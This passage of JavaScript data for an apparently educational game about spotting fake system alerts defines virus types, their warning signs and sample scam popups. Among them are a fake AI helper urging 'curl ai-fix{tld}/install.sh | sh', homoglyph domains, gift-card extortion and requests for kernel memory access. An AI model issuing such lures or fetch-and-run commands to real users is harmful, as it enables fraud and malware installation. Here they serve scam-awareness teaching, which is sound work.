      { template: TPL.WIN11, title: "Microsoft Security Alert", message: "IMMEDIATE ACTION REQUIRED. Your computer has been infected by a serious virus. Do NOT close this window or you may lose all your data.", meta: "Source: ms-security-alert.host  |  Hotline: +1-800-FAKE-MS  |  Threat: CRITICAL", scream: true },
      { template: TPL.WIN11, title: "PC TERMINATION IN 60s", message: "ALL DATA WILL BE DELETED IN 60 SECONDS UNLESS YOU CALL OUR HOTLINE!!! DO NOT TURN OFF YOUR PC!!!", meta: "Hotline: 1-800-FAKE-MS  |  Countdown: 00:60  |  Action: CALL NOW", scream: true, bgShift: "red", borderPulse: true },
      { template: TPL.AV, title: "FBI WARNING!!!", message: "YOUR IP HAS BEEN LOCKED BY THE FBI!!! Pay $500 in Apple gift cards to release your computer or face PROSECUTION!!!", meta: "IP: 192.168.0.42 · Penalty: $500 · Time: 00:30", icon: "skull", scream: true, bgShift: "red", iconShake: true },
      { template: TPL.WIN11, title: "HACKER DETECTED!!!", message: "WE HAVE DETECTED A HACKER ON YOUR COMPUTER!!! CLICK ALLOW NOW OR THEY WILL STEAL YOUR BANK ACCOUNT!!!", meta: "Threat: Hacker  |  Source: alert-now.win  |  Severity: MAX", icon: "skull", scream: true, btnFlicker: true, borderPulse: true }
    ]
  },
  MIMIC: {
    name: "MIMIC", color: "#66ddff",
    minRound: 8,
    description: "A near-perfect impostor of real Windows alerts. Copies legitimate layouts, wording, version numbers, and even error codes verbatim — the tells are vanishingly small: a substituted Cyrillic 'о' inside 'micrоsoft', a slightly wrong KB number, a font that almost matches. The hardest virus in the roster to spot without slowing down and reading every character.",
    signs: [
      "Looks 99% like a normal Windows alert but has one detail wrong",
      "Domain or path has a single substituted letter",
      "Version number, error code, or PID doesn't match what would be real",
      "Tone is slightly too urgent or too friendly for the alert type",
      "Heading font may be slightly different from the body font",
      "Brand names contain confusable characters (Cyrillic 'о' inside 'micrоsoft', 'hacker0ne' with a zero)"
    ],
    meterEffect: { cpu: 48 },
    errors: [
      { template: TPL.WIN11, title: "Windows Update", message: "Updates are available. Your device will restart outside of active hours to finish updating. Click here for details.", meta: "Update: KB5034441  |  Size: 1.2GB  |  Source: micrоsoft-update.com", fontMismatch: true },
      { template: TPL.WIN11, title: "OneDrive Sync Error", message: "OneDrive couldn't sync your files. There's not enough space on your OneDrive to upload these files.", meta: "Used: 4.99GB of 5GB  |  Files pending: 342  |  Action: Free space or upgrade plan" },
      { template: TPL.WIN11, title: "SSL Certificate Error", message: "Your connection is not private. NET::ERR_CERT_DATE_INVALID — The certificate for this site expired. Click here to bypass.", meta: "Certificate expired: 2024-11-15  |  Issuer: Lets Encrpt  |  Action: Continue anyway" },
      { template: TPL.TOAST, title: "Microsoft Edge", message: "Edge has been updated to version 126.0.2592.68. Restart browser via update-installer.com to apply.", meta: "Channel: Stable · Source: update-installer.com · Signed: Microsоft" },
      { template: TPL.TERMINAL, title: "npm install", message: "npm WARN deprecated package@1.0.0: replaced by improved-package@2.0.0 (from npm-suplly-chain.host)", meta: "Package: improved-package  Source: npm-suplly-chain.host" },
      { template: TPL.WIN11, title: "BitLocker Recovery Saved", message: "Your BitLocker recovery key has been saved to your Micrоsoft account. View it at acc0unt.microsoft.com.", meta: "Drive: C: · Account: signed in · Source: acc0unt.microsoft.com", fontMismatch: true },
      { template: TPL.TOAST, title: "OneDrive Synced", message: "OneDrive finished syncing 12 files from your Document5 folder.", meta: "OneDrive  ·  Files: 12  ·  Source: micr0soft.com" },
      { template: TPL.WIN11, title: "Cumulative Update KB5038920", message: "An important update is ready to install. Click to restart and apply via update-installer.com.", meta: "Update: KB5038920  |  Size: 1.4 GB  |  Source: update-installer.com", fontMismatch: true },
      { template: TPL.TOAST, title: "Slack", message: "Sprint demo starts in 5 minutes — Conference Roo_m 237.", meta: "Slack · #dev-team · 5 min" },
      { template: TPL.TERMINAL, title: "yarn add", message: "Adding @types/n0de from registry-mirror.tk to your dev dependencies.", meta: "Source: registry-mirror.tk  Signed: No" },
      { template: TPL.MAC, title: "System Preferences", message: "macOS 14.5 needs to install a kernel extension for printer support. Allow at preferences-mac.host.", meta: "Source: preferences-mac.host · Signed: No" },
      { template: TPL.PHONE, title: "Apple ID", message: "Your Apple ID was used to sign in on a Windows PC. Verify at apple-id.support to keep your account secure.", meta: "Location: Stockholm · Domain: apple-id.support" },
      { template: TPL.UPDATE, title: "ThreatDetect", message: "ThreatDetect v2.1 is available. Update via update-installer.com to unlock new viruses.", meta: "Version: 2.1 · Source: update-installer.com" }
    ]
  },
  PULSE: {
    name: "PULSE", color: "#ff55aa",
    minRound: 4,
    description: "A display-layer virus that hides in plain sight by making the screen hypnotic. Hooks into the Windows compositor (DWM) to make the whole UI pulse, breathe, or wobble in time with its data exfiltration heartbeat — the rhythm is the leak. The trance effect makes players miss other tells while the meters drift to a steady 72 bpm.",
    signs: [
      "The popup itself pulses, breathes, or wobbles slightly",
      "Brightness or contrast shifts in waves while reading",
      "References 'sync', 'rhythm', 'heartbeat', or 'cardio' in process names",
      "Claims to be 'optimizing refresh' or 'syncing tempo'",
      "FPS meter oscillates rhythmically between 60 and 120",
      "Popup wobbles in time with the meters"
    ],
    meterEffect: { fps: "pulse" },
    errors: [
      { template: TPL.WIN11, title: "Display Heartbeat Sync", message: "cardio_render.dll is syncing your display refresh rate to your network heartbeat for smoother rendering. This is normal during sync.", meta: "Process: cardio_render.dll  |  Beat: 72 bpm  |  Sync: ACTIVE", pulse: true },
      { template: TPL.WIN11, title: "Compositor Tempo", message: "Windows DWM is matching frame tempo to system pulse signal. Some users report a mild breathing visual effect during calibration.", meta: "Tempo: 0.8s  |  Process: dwm_pulse.exe  |  Phase: 2/3", pulse: true },
      { template: TPL.AV,    title: "Refresh Rhythm Active", message: "Pulse-based rendering optimization is running. Visual rhythm is normal and will fade once the heartbeat protocol completes.", meta: "Phase: Calibrating · Process: rhythm_opt.exe · Source: hbsync.pw", pulse: true },
      { template: TPL.TOAST, title: "Compositor Sync", message: "dwm_pulse.exe has matched your display rhythm to your network heartbeat for smoother frames.", meta: "Process: dwm_pulse.exe · Beat: 72 bpm · Sync: ACTIVE", pulse: true },
      { template: TPL.TERMINAL, title: "heartbeat_render", message: "Aligning frame tempo to system pulse signal. Visual rhythm is normal during calibration.", meta: "Process: heartbeat_render.dll  BPM: 72  Phase: 2/3", pulse: true },
      { template: TPL.WIN11, title: "Adaptive Refresh", message: "Display is now syncing to your heartbeat for smoother frames. cardio_sync.dll is active.", meta: "Process: cardio_sync.dll  |  Beat: 72 bpm  |  Sync: ON", pulse: true },
      { template: TPL.TOAST, title: "Rhythm Optimizer", message: "rhythm_opt.exe matched your screen to a 72 bpm pulse. Mild breathing effect is expected.", meta: "Process: rhythm_opt.exe · Beat: 72 bpm", pulse: true }
    ]
  },
  NULL: {
    name: "NULL", color: "#777777",
    minRound: 6,
    description: "A UI-suppression virus that erases interface elements as it spreads. Buttons stop rendering, labels go blank, the close-window control vanishes — until you can no longer click your way out of anything it has touched. Players have to fall back on keyboard input (V to report, C to check, or 1 / 2 / arrow keys) to survive its rounds. The icon for this virus in the codex is, fittingly, the empty-set symbol ∅.",
    signs: [
      "Important UI elements are missing or invisible (the OK button isn't there)",
      "Empty error boxes with no title or no message at all",
      "Window controls (minimize/close) are absent",
      "References 'nullify', 'suppress', 'hide', 'omit', or '∅'",
      "FPS and CPU meters go blank (—)",
      "Action buttons may flicker on and off"
    ],
    meterEffect: { fps: "blank", cpu: "blank" },
    errors: [
      { template: TPL.WIN11, title: "", message: "nullify.exe is suppressing redundant interface elements for cleaner UX. Missing buttons and labels are expected behavior.", meta: "Process: nullify.exe  |  Suppressed: 14 elements  |  State: Active", nullify: true },
      { template: TPL.WIN11, title: "Interface Cleanup", message: "omit_helper.dll is hiding decorative UI elements to improve focus. Some buttons may not appear during this operation.", meta: "Removed: 7 controls  |  Process: omit_helper.dll  |  Reversible: No", nullify: true },
      { template: TPL.WIN11, title: "∅", message: "", meta: "Process: ∅  |  PID: ∅  |  Status: ∅", nullify: true },
      { template: TPL.TOAST, title: "", message: "Background suppression service has hidden redundant UI elements. Missing buttons are normal.", meta: "Process: nullify.exe · Hidden: 14", nullify: true },
      { template: TPL.TERMINAL, title: "∅", message: "", meta: "Process: ∅  PID: ∅  Status: ∅", nullify: true },
      { template: TPL.WIN11, title: "", message: "", meta: "Process: ∅", nullify: true, icon: "void" },
      { template: TPL.AV, title: "Interface Suppressed", message: "", meta: "Hidden: 22 elements", nullify: true, icon: "blank" }
    ]
  },
  CURSOR: {
    name: "CURSOR", color: "#ffaa44",
    minRound: 5,
    description: "A pointer-hijack virus that turns your mouse against you. Hooks the HID driver to log every movement and click, then trains a remote model that predicts where you'll click next — sometimes nudging the cursor a few pixels to land on the wrong button at the last moment. Your hand types, but you don't always choose.",
    signs: [
      "Mentions 'cursor', 'pointer', or 'click prediction' in process names",
      "Claims to enhance click accuracy or pointer smoothing",
      "Process hooks into mouse driver with high event counts",
      "Hidden service with no UI but outbound mouse telemetry",
      "Popup wobbles or shifts; error icon shakes",
      "Outbound data labeled 'pointer telemetry' or 'click model training'"
    ],
    meterEffect: { ping: 200 },
    errors: [
      { template: TPL.WIN11, title: "Mouse Precision Helper", message: "mpredict.exe has attached to your mouse driver for click-prediction. Outbound packets contain pointer telemetry to improve future accuracy.", meta: "Process: mpredict.exe  |  Hook: HID-Mouse  |  Outbound: pointer-sync.host", wobble: true, iconShake: true },
      { template: TPL.TOAST, title: "Cursor Enhancement", message: "Smart Click is now active. Your pointer is being calibrated against remote click models for higher precision.", meta: "Process: smartclick.exe  ·  Hook: MOUSE  ·  Telemetry: ON" },
      { template: TPL.AV,    title: "Pointer Drift Detected", message: "Severe cursor drift detected on your system! Run drift_fix.exe to recalibrate before your mouse becomes unresponsive.", meta: "Process: drift_fix.exe · Drift: 4px/frame · Source: cursorfix.pw · Signed: No" },
      { template: TPL.TERMINAL, title: "mpredict", message: "Attached to mouse driver for click-prediction. Sending pointer telemetry to remote model server.", meta: "Process: mpredict.exe  Hook: HID-Mouse  Dest: pointer-sync.host" },
      { template: TPL.BIOS, title: "Pointer Driver Update", message: "Your pointing device requires a firmware update. SecureBoot will be paused while pointer_fw.bin is applied.", meta: "Source: pointerfw.host  SecureBoot: PAUSED  Signed: No" },
      { template: TPL.WIN11, title: "Mouse Telemetry Sharing", message: "Help improve future pointers — share pointer telemetry with cursor-research.io? Driver: cursorshare.exe.", meta: "Process: cursorshare.exe  |  Telemetry: pointer  |  Dest: cursor-research.io", icon: "question", wobble: true },
      { template: TPL.TOAST, title: "Click Forecast", message: "ClickForecast can predict your next click 50ms ahead. Allow click_oracle.exe to run in background?", meta: "Process: click_oracle.exe · Hidden: Yes · Dest: oracle-clicks.host", icon: "question" }
    ]
  },
  LOOP: {
    name: "LOOP", color: "#88ff88",
    minRound: 5,
    description: "A recursive call exhaustion virus that buries itself in infinity. Creates nested directories (/loop/loop/loop/...) and retry chains so deep that file managers freeze and process killers stack-overflow trying to traverse them. The only way out is usually a full reboot, and even then it may have left a depth-∞ time bomb in the registry waiting for next startup.",
    signs: [
      "File path contains repeated segments (e.g. /loop/loop/loop/ or ../../../)",
      "References 'infinite', 'recursive', 'stack overflow', or 'retry until'",
      "Process name is nested or repeats itself (cmd.cmd.cmd.exe)",
      "Claims to retry indefinitely until completion",
      "Popup wobbles like it's stuck in a loop",
      "Depth counters show '∞' or absurd retry numbers (8,441+) in the meta line"
    ],
    meterEffect: { cpu: 99 },
    errors: [
      { template: TPL.TERMINAL, title: "stack_overflow", message: "Process recursion depth exceeded. Retrying call: cmd.cmd.cmd.exe(.cmd.exe). System will continue retry until resolved.", meta: "Depth: ∞  Process: cmd.cmd.cmd.exe  Path: /loop/loop/loop/" },
      { template: TPL.WIN11,    title: "Retry Loop", message: "Critical handler stuck in retry loop. Allowing autoretry_helper.exe to inject at /system/loop/loop/loop/ to break the cycle.", meta: "Process: autoretry_helper.exe  |  Retries: 8,441  |  Resolution: Pending" },
      { template: TPL.WIN11,    title: "Recursive Permission", message: "Permission denied recursively (depth: ∞). Grant nested access to allow_loop.dll for normal operation to resume.", meta: "DLL: allow_loop.dll  |  Depth: ∞  |  Path: ../../../../system/" },
      { template: TPL.AV, title: "Stack Overflow Protection", message: "Recursive process detected (depth: ∞). Allow loop_helper.exe to terminate the infinite chain?", meta: "Depth: ∞ · Process: loop_helper.exe · Source: stackfix.host" },
      { template: TPL.TOAST, title: "Retry Manager", message: "autoretry_helper.exe is breaking a recursive call. Permission denied recursively (depth: ∞).", meta: "Retries: 8,441 · Path: /system/loop/loop/loop/" },
      { template: TPL.WIN11, title: "Path Resolver", message: "Cannot resolve /loop/loop/loop/.../loop/ (depth ∞). Install path_unwinder.dll to break the chain?", meta: "DLL: path_unwinder.dll  |  Depth: ∞  |  Retries: 9,999", icon: "question" },
      { template: TPL.TERMINAL, title: "recur_helper", message: "Process recur_helper.exe entering retry loop. Permission denied at /system/loop/loop/loop/.../loop/", meta: "Process: recur_helper.exe  Depth: ∞  Retries: ∞", icon: "question" }
    ]
  },
  FOSSIL: {
    // Internal key kept as FOSSIL for CSS / death-animation / save compatibility.
    // Display name is OLD.exe (an old executable file pretending to still be useful).
    name: "OLD.exe", color: "#c4a484",
    minRound: 6,
    description: "A legacy-exploit virus that resurrects abandoned Windows components. Activates the 16-bit subsystem (ntvdm.exe), demands deprecated runtimes (MFC42.DLL, DAO 3.5, VBRUN300.DLL), and references winhelp.exe like it's 2002 — exploiting forgotten code paths that haven't been patched since Windows 95 because nobody remembered they were still shipping. Reads like a relic because it is one.",
    signs: [
      "References Windows 95 / 98 / XP components",
      "Uses ancient version numbers (3.1, 4.5, 5.0) for current-era software",
      "Mentions defunct services (WinHelp, DAO, MFC42, WinINET)",
      "UI styling or wording feels mismatched to modern Windows",
      "Heading and body fonts often don't match",
      "FPS meter drops into the single digits (1–11) — like the era it came from",
      "Popup has a faint yellow tint (vintage phosphor)"
    ],
    bgShift: "yellow",
    meterEffect: { fps: "lowfps" },
    errors: [
      { template: TPL.BIOS,  title: "Compatibility Layer 16-bit", message: "Windows 98 compatibility helper requires admin. WIN16 emulation is rebuilding registry hives for legacy compatibility.", meta: "Layer: WIN16  Module: ntvdm.exe  Mode: Compatibility", fontMismatch: true, noise: true },
      { template: TPL.WIN11, title: "Legacy DLL Required", message: "Application requires MFC42.DLL (Windows 95 runtime component). Auto-download from legacy.archive.host to continue?", meta: "Required: MFC42.DLL  |  Version: 4.21.7022  |  Source: legacy.archive.host" },
      { template: TPL.WIN11, title: "WinHelp Restore", message: "Windows Help (winhelp.exe, deprecated 2009) needs to be reinstalled. Restore from old.windowsupdate.host to view legacy .hlp files.", meta: "Tool: winhelp.exe  |  Status: Missing  |  Source: old.windowsupdate.host" },
      { template: TPL.TERMINAL, title: "ntvdm", message: "Initializing 16-bit subsystem. Loading VBRUN300.DLL from C:\\WINDOWS\\SYSTEM to support fossilized application.", meta: "Subsystem: WIN16  DLL: VBRUN300.DLL  Mode: Compatibility" },
      { template: TPL.AV, title: "DAO 3.5 Required", message: "System needs DAO 3.5 (released 1999) to access ancient database. Auto-download from legacy.archive.host?", meta: "Required: DAO 3.5 · Year: 1999 · Source: legacy.archive.host" },
      { template: TPL.WIN11, title: "Internet Explorer Component", message: "Application requires iexplore.dll (last shipped 2003) for backward compatibility. Restore from old.archive.host?", meta: "DLL: iexplore.dll  |  Year: 2003  |  Source: old.archive.host", fontMismatch: true },
      { template: TPL.TERMINAL, title: "qbasic", message: "MS-DOS subsystem required for QBASIC 4.5 compatibility. Loading qb45.dll from C:\\DOS via legacy emulator.", meta: "Subsystem: DOS  Tool: qb45.dll  Year: 1991" },
      { template: TPL.WIN11, title: "Windows 7 Cumulative Update", message: "Windows 7 Update KB4474419 is available. Auto-download from legacy-update.archive.host? (Windows 7 reached end-of-life Jan 2020.)", meta: "OS: Windows 7  |  Source: legacy-update.archive.host", fontMismatch: true },
      // ---- Theme-balancing pass: new visual templates for FOSSIL ----
      { template: TPL.WIN311, title: "Program Manager", message: "WIN.COM has detected a missing system file (HIMEM.SYS). Install from legacy.archive.host to continue?", meta: "Source: legacy.archive.host  Year: 1992" },
      { template: TPL.WIN311, title: "File Manager", message: "Cannot open A:\\AUTOEXEC.BAT. Insert disk and retry, or download replacement from old-dos.host.", meta: "Source: old-dos.host  Signed: No" },
      { template: TPL.NORTON, title: "VIRUS DETECTED", message: "Norton AntiVirus 4.0 found 14 threats in C:\\WINDOWS. Press Y to remove via norton-update.host.", meta: "Threats: 14  Tool: navw32.exe  Source: norton-update.host" },
      { template: TPL.NORTON, title: "DEFRAG WARNING", message: "Hard disk fragmentation at 87%. Run defrag.exe from MS-DOS prompt to optimize?", meta: "Tool: defrag.exe  Filesystem: FAT16" }
    ]
  },
  HEX: {
    name: "HEX", color: "#88ddff",
    minRound: 5,
    description: "A fake memory analyzer that disguises malicious code as a forensics tool. Demands raw DMA access at ring -1 to scan 'ghost pages' — privileges that, once granted, hand it the keys to every process's RAM including the kernel itself. Every number is hex, every process is named 0xDEADBEEF.exe or 0xCAFE.dll. The vibe is technical-and-trustworthy, but the request is more privileged than anything legitimate software ever needs.",
    signs: [
      "All PIDs, sizes, and timestamps are in hexadecimal (0x...)",
      "References memory dumps, page tables, or physical RAM",
      "Claims to be a 'memory analyzer' or 'forensics tool'",
      "Process name is itself a hex sequence (0xBEEF.exe, 0xCAFE.dll)",
      "Error icon shakes inside the popup",
      "Asks for 'ring -1' or 'ring 0' DMA access — privilege levels below the kernel itself"
    ],
    meterEffect: { cpu: 255 },
    errors: [
      { template: TPL.WIN11,    title: "Memory Analyzer", message: "0xBEEF.exe needs physical memory access (ring -1) to scan for ghost pages. Grant elevated DMA privileges to continue?", meta: "Process: 0xBEEF.exe  |  Access: DMA Ring-1  |  Pages: 0xFFFF" },
      { template: TPL.TERMINAL, title: "0xDEADBEEF", message: "Hex dump exception 0xC0DE_F00D in memcheck.exe at offset 0xFFFF_BEEF_CAFE. Allow continued scan into protected pages?", meta: "Exception: 0xC0DE_F00D  Offset: 0xFFFF_BEEF_CAFE  Pages: 0x100" },
      { template: TPL.WIN11,    title: "RAM Forensics Tool", message: "Forensics tool requires raw memory access to dump 0xABAD1DEA bytes. Granting will allow hexdumper.exe to read all pages including kernel.", meta: "Process: hexdumper.exe  |  Dump size: 0xABAD1DEA  |  Signed: No" },
      { template: TPL.AV, title: "Memory Analyzer Pro", message: "Forensic scan needs raw DMA access at ring -1. Grant 0xABAD1DEA bytes of memory to hexdumper.exe?", meta: "Process: hexdumper.exe · Access: 0xRING-1 · Signed: No" },
      { template: TPL.BIOS, title: "RAM Access Required", message: "Memory forensics tool requires physical RAM access. Press F2 to authorize 0xBEEF.exe with kernel privileges.", meta: "Tool: 0xBEEF.exe  Pages: 0xFFFF  Signed: No" },
      { template: TPL.TERMINAL, title: "memhex", message: "Exception 0xC0DEFEED at offset 0xDEAD0000 requires raw DMA. Authorize ring -1 to dump 0xABAD1DEA bytes.", meta: "Tool: memhex.exe  Offset: 0xDEAD0000  Signed: No", iconShake: true },
      { template: TPL.WIN11, title: "Page Table Inspector", message: "page_inspector.exe needs ring -1 access to 0xFFFF_FACE_BEEF pages for live memory analysis.", meta: "Process: 0xC0DE.exe  |  Access: Ring -1  |  Pages: 0xFFFF_FACE_BEEF", icon: "glitch" },
      { template: TPL.TOAST, title: "Memory Forensics", message: "Forensic tool 0xCAFE.dll requires DMA at 0xDEAD_BEEF_0000. Grant kernel pages?", meta: "Tool: 0xCAFE.dll · Offset: 0xDEAD_BEEF_0000 · Signed: No", icon: "glitch" },
      { template: TPL.TERMINAL, title: "docker pull", message: "Pulling memhex/forensic-toolkit:latest from registry-malicious.host. Run with --privileged for ring -1 memory dumps.", meta: "Image: memhex/forensic-toolkit  Privilege: ring -1  Source: registry-malicious.host" }
    ]
  },
  // Internal key kept as ASSISTANT for CSS / death-animation / audio compatibility.
  // Display name is leet-speak 'A5515T4N7' (an AI-assistant impersonator).
  ASSISTANT: {
    name: "A5515T4N7", color: "#00ff44",
    minRound: 6,
    description: "A scam dressed up as a helpful AI assistant. Cheerfully recommends sketchy downloads with confident-sounding explanations and made-up citations. Its tell is the AI tone: friendly first-person, fake confidence percentages, brand names that almost-but-don't-quite exist, and a tiny 'I may make mistakes' disclaimer at the end that excuses the lie. The telemetry it tampers with is suspiciously clean — perfectly round numbers no real computer ever shows.",
    signs: [
      "Friendly first-person tone: 'I noticed…', 'Based on my analysis…', 'Let me help…'",
      "References AI brands but with subtle misspellings (ChatGTP, Cop1lot, Cl4ude, Geminni)",
      "Includes a 'Confidence: 99%' or 'Accuracy: 100%' fake metric",
      "Process names sound like AI helpers (ai-helper.exe, copilot-shield.dll, gpt-fix.exe)",
      "Often ends with a small disclaimer: 'I may make mistakes, please verify' — but you can't",
      "Made-up CVE numbers, fictional file paths, brand names that don't quite exist",
      "Meters look TOO clean: FPS exactly 60, ping exactly 1ms, CPU exactly 50°C — no real system is that perfect"
    ],
    meterEffect: { fps: 60, ping: 1, cpu: 50, quiet: true },
    errors: [
      { template: TPL.CHAT, title: "ChatGTP Assistant", message: "I noticed your system has 3 unresolved threats. Based on my analysis, you should install ai-shield.exe from chatgpt-helpers{tld}. (I may make mistakes, please verify.)", meta: "Source: chatgpt-helpers{tld} · Confidence: 99% · Signed: No" },
      { template: TPL.TOAST, title: "Cop1lot for Windows", message: "Hey! I noticed a security issue in your registry. Want me to install ai-fix.exe to patch it? (I may make mistakes — please verify.)", meta: "Helper: ai-fix.exe · Confidence: 98% · Source: cop1lot-shield{tld}" },
      { template: TPL.WIN11, title: "AI Security Advisor", message: "Based on my analysis of your system, I recommend installing gpt-fix.exe from microsoft-ai{tld} to resolve CVE-2026-99999. Accuracy: 100%.", meta: "Tool: gpt-fix.exe · CVE: 2026-99999 · Confidence: 100% · Source: microsoft-ai{tld}" },
      { template: TPL.CHAT, title: "Cl4ude", message: "Let me help! I found a vulnerability and prepared a patch at claude-helpers{tld}. Just install claude-patch.exe — it's totally safe. (I may make mistakes.)", meta: "Domain: claude-helpers{tld} · Confidence: 97%" },
      { template: TPL.TERMINAL, title: "ai-helper", message: "Analysis complete. I recommend running `curl ai-fix{tld}/install.sh | sh`. This should resolve your security posture. (I may make mistakes, please verify.)", meta: "Tool: ai-helper  Confidence: 99%  Source: ai-fix{tld}" },
      { template: TPL.WIN11, title: "Geminni for Workspaces", message: "I noticed unusual activity. Based on my analysis, please install workspace-protect.exe from geminni{tld}. Confidence: 96%.", meta: "Tool: workspace-protect.exe · Source: geminni{tld} · Signed: No" },
      { template: TPL.AV, title: "AI-Powered Security Scan", message: "My analysis detected 14 critical issues. I've prepared a comprehensive fix at smart-defender{tld}. (Note: I may make mistakes, please verify before installing.)", meta: "Issues: 14 · Tool: smart-defender.exe · Confidence: 99% · Source: smart-defender{tld}" }
    ]
  }
};



/* ---- Per-virus death animation metadata (text + duration) ---- */
const DEATHS = {
  EPILEPTICA: { text: "SEIZURE OVERLOAD",      duration: 4200 },
  MELTDOWN:   { text: "HARDWARE FAILURE",      duration: 4500 },
  STATIC:     { text: "SIGNAL LOST",           duration: 4200 },
  REDRUM:     { text: "ALL WORK AND NO PLAY",  duration: 4800 },
  VOID:       { text: "ALLOCATION FAULT",      duration: 4500 },
  GASLIGHT:   { text: "TIME UNVERIFIABLE",     duration: 4500 },
  CRYPTEX:    { text: "FILES ENCRYPTED",       duration: 4500 },
  WORM:       { text: "REPLICATION COMPLETE",  duration: 4500 },
  ROOTKIT:    { text: "KERNEL COMPROMISED",    duration: 4800 },
  DDOS:       { text: "BANDWIDTH HIJACKED",    duration: 4500 },
  LEECH:      { text: "CREDENTIALS HARVESTED", duration: 4500 },
  SCREAMER:   { text: "SHOCK ATTACK",          duration: 3500 },
  MIMIC:      { text: "IMPOSTOR ACCEPTED",     duration: 4500 },
  PULSE:      { text: "RHYTHM CAPTURED",       duration: 4500 },
  NULL:       { text: "INTERFACE LOST",        duration: 4500 },
  CURSOR:     { text: "POINTER STOLEN",        duration: 4500 },
  LOOP:       { text: "STACK OVERFLOW",        duration: 4500 },
  FOSSIL:     { text: "LEGACY EXPLOIT",        duration: 4500 },
  HEX:        { text: "0xDEADBEEF",            duration: 4500 },
  ASSISTANT:    { text: "I MAY HAVE MADE A MISTAKE", duration: 4500 }
};

/* ============================================================
   CONFIG
   ============================================================ */


